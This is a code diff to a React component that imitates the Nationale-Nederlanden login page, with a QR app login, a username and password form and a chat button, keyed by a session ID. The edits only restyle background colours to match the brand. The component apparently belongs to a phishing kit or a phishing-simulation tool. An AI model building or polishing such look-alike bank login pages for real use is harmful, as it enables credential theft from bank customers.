@@ -38,7 +38,7 @@ export function NationaleNederlandenClient({ sessionId }: { sessionId: string })
   }
 
   return (
-    <div className="min-h-screen bg-white font-sans flex flex-col text-[#333]">
+    <div className="min-h-screen bg-[#fff6ec] font-sans flex flex-col text-[#333]">
       
       {/* Header */}
       <header className="w-full flex items-center justify-between px-8 py-6 max-w-6xl mx-auto">
@@ -66,7 +66,7 @@ export function NationaleNederlandenClient({ sessionId }: { sessionId: string })
           {/* Top Left: App Login */}
           <div className="border border-gray-200 rounded-sm p-8 flex flex-col items-center justify-center">
             <h2 className="text-[22px] font-bold mb-6 text-center">Inloggen met de NN App</h2>
-            <div className="bg-white p-2 border border-gray-200 shadow-sm mb-4">
+            <div className="bg-[#fff6ec] p-2 border border-gray-200 shadow-sm mb-4">
               {/* Dummy QR Code */}
               <img src="/bank-assets/nationale-nederlanden-qr.svg" alt="QR Code" className="w-[150px] h-[150px]" />
             </div>
@@ -74,7 +74,7 @@ export function NationaleNederlandenClient({ sessionId }: { sessionId: string })
           </div>
 
           {/* Top Right: Password Login */}
-          <div className="border border-gray-200 rounded-sm p-8 bg-white">
+          <div className="border border-gray-200 rounded-sm p-8 bg-[#fff6ec]">
             <form onSubmit={(e) => { e.preventDefault(); void handleSubmit(); }}>
               <div className="mb-5">
                 <label className="block text-[14px] font-bold mb-2">Gebruikersnaam</label>
@@ -159,7 +159,7 @@ export function NationaleNederlandenClient({ sessionId }: { sessionId: string })
       </footer>
 
       {/* Floating Chat */}
-      <div className="fixed bottom-6 right-6 bg-white border border-gray-300 shadow-lg rounded-sm py-2 px-4 flex items-center gap-2 cursor-pointer hover:bg-gray-50 text-[#EA650D] font-bold text-[14px]">
+      <div className="fixed bottom-6 right-6 bg-[#fff6ec] border border-gray-300 shadow-lg rounded-sm py-2 px-4 flex items-center gap-2 cursor-pointer hover:bg-gray-50 text-[#EA650D] font-bold text-[14px]">
         <svg className="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M8 10h.01M12 10h.01M16 10h.01M9 16H5a2 2 0 01-2-2V6a2 2 0 012-2h14a2 2 0 012 2v8a2 2 0 01-2 2h-5l-5 5v-5z"></path></svg>
         Chat
       </div>
